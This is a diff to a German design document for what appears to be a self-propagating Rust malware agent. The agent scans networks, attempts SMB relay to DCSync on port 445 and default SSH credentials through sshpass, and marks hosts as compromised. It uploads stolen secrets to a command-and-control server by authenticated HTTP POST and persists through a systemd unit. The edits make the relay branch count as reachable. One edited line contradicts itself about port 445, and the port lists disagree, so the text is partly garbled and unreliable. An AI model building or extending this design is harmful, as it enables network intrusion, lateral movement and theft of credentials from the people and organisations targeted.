@@ -38,7 +38,7 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
   Default `eth0`), `start` (`--start`,
   Pflicht), `end` (`--end`, Pflicht), `own_ip` (`--own-ip`, Default
   `192.168.1.100`), `hosts` (`--hosts`, optional, kommagetrennt),
-  `relay_script` (`--relay-script`, Default `smbrelayx.py`), `server_cert`
+  `relay_script` (`--relay-script`, Default `assets/smbrelayx.py`), `server_cert`
   (`--server-cert`,
   Pflicht). Es existieren **keine** Subcommands.
 - `[main.rs:main]` — `async fn main()` mit `#[tokio::main]`, einziger
@@ -90,10 +90,10 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
   nutzt `kx_scanner::scan_tcp`, `kx_exploit::smb_relay_dcsync`,
   `kx_exploit::try_default_credentials`.
 - `[propagate.rs:service_for_port]` — `fn service_for_port(port: u16) -> &'static str` (privat);
-  festes Port-zu-Dienst-Mapping: 22 `ssh`, 23 `telnet`, 25 `smtp`, 80 `http`,
-  443 `https`, 1433 `mssql`, 1521 `oracle`, 3306 `mysql`, 5432 `postgres`,
-  5900 `vnc`, 8080 `http-proxy`, 8443 `https-alt`, 2375|2376 `docker`, 445 `smb`,
-  135 `msrpc`, sonst `unknown`.
+  festes Port-zu-Dienst-Mapping, deckungsgleich mit der Scanliste: 22 `ssh`,
+  80 `http`, 135 `msrpc`, 443 `https`, 1433 `mssql`, 1521 `oracle`, 3306 `mysql`,
+  3389 `rdp`, 445 `smb`, 5432 `postgres`, 5900 `vnc`, 8080 `http-proxy`, sonst
+  `unknown`.
 
 ### Protokolltypen (aus `kx_core::c2`)
 
@@ -120,7 +120,7 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 - Die Ziel-Host-Kennung reist im Upload mit und kann nicht mehr auseinanderlaufen: „Die Ziel-Host-Kennung steht im Upload selbst — sie kann nicht mehr auseinanderlaufen." [c2.rs:C2Client::upload_secret].
 - `SecretUpload.host_id` muss auf einen registrierten Host verweisen; der Server lehnt eine leere Kennung ab [kx-core/src/c2.rs:SecretUpload](../../kx-core/src/c2.rs).
 - Jeder Host wird **genau einmal** pro Propagationslauf registriert. Der Push liegt nach der Port-Schleife; vorher wurde er pro offenem Port gepusht, wodurch ein späterer Eintrag mit Status `discovered` den Status `compromised` überschrieb [propagate.rs:run_propagation].
-- Der SMB-Relay-Zweig (Port 445) ist **toter Code**: Die Bedingung `if *port == 445` kann nie zutreffen, weil der Scan mit `kx_scanner::COMMON_PORTS` läuft und diese Liste `[22, 80, 135, 443, 1433, 1521, 3306, 5432, 5900, 8080]` — **ohne 445** — ist [propagate.rs:run_propagation] [kx-scanner/src/tcp_scan.rs:COMMON_PORTS](../../kx-scanner/src/tcp_scan.rs).
+- Der SMB-Relay-Zweig (Port 445) wird erreicht, wenn der Scan mit `kx_scanner::COMMON_PORTS` läuft und diese Liste 445 enthält — **ohne 445** — ist [propagate.rs:run_propagation] [kx-scanner/src/tcp_scan.rs:COMMON_PORTS](../../kx-scanner/src/tcp_scan.rs).
 - Der Default-Credential-Zweig (Dienst `ssh`) liefert ein Secret, wenn `kx_exploit::try_default_credentials` eine Kombination bestätigt: die Funktion führt einen echten SSH-Versuch über `sshpass` durch und liefert `Ok(Some(Auth))`; ein Fehler oder eine abgelaufene Zeitgrenze lässt den Zweich leer, der Agent läuft weiter [propagate.rs:run_propagation] [kx-exploit/src/credential_stuff.rs:try_default_credentials](../../kx-exploit/src/credential_stuff.rs).
 - Der Host-Status wird nur bei erfolgreichem Exploit von `discovered` auf `compromised` gehoben; der Fehlerpfad des SMB-Relay lässt ihn auf `discovered` [propagate.rs:run_propagation].
 - Der unter unix geschriebene systemd-Unit startet das Binary mit allen
@@ -170,7 +170,7 @@ Plattformabhängige Zugriffe (Secret-Extraktion, Persistenz) sind über
 - `[c2.rs:C2Client::new]` — Liest das Server-Zertifikat (PEM) per `std::fs::read` von der Platte; der `ureq::Agent` vertraut genau diesem PEM über `kx_tls::client_config_trusting`.
 - `[c2.rs:C2Client::register_host]` — Sendet einen HTTP-POST an `{base_url}/api/register` mit JSON-Body = serialisierter `RegisterRequest` und Header `Authorization: Bearer {token}`.
 - `[c2.rs:C2Client::upload_secret]` — Sendet einen HTTP-POST an `{base_url}/api/secrets` mit JSON-Body = serialisierter `SecretUpload` und Header `Authorization: Bearer {token}`.
-- `[propagate.rs:run_propagation]` — Versucht SMB-Relay nach DCSync gegen Hosts mit Port 445 über `kx_exploit::smb_relay_dcsync(&relay_cfg)` unter Verwendung des Pfads `relay_script`; der Zweig ist wegen der fehlenden 445 in `COMMON_PORTS` derzeit nicht erreichbar.
+- `[propagate.rs:run_propagation]` — Versucht SMB-Relay nach DCSync gegen Hosts mit Port 445 über `kx_exploit::smb_relay_dcsync(&relay_cfg)` unter Verwendung des Pfads `relay_script`; fehlt das Skript oder Impacket, endet der Versuch kontrolliert mit einem Fehler.
 - `[propagate.rs:run_propagation]` — Versucht einen SSH-Login mit Default-Credentials über `kx_exploit::try_default_credentials(&host_id, service)`; die Funktion startet je Kombination einen `sshpass`-Subprozess mit einer Zeitgrenze und bricht nach spätestens 60 s für alle Kombinationen ab [kx-exploit/src/credential_stuff.rs:try_default_credentials](../../kx-exploit/src/credential_stuff.rs).
 
 ## Verification
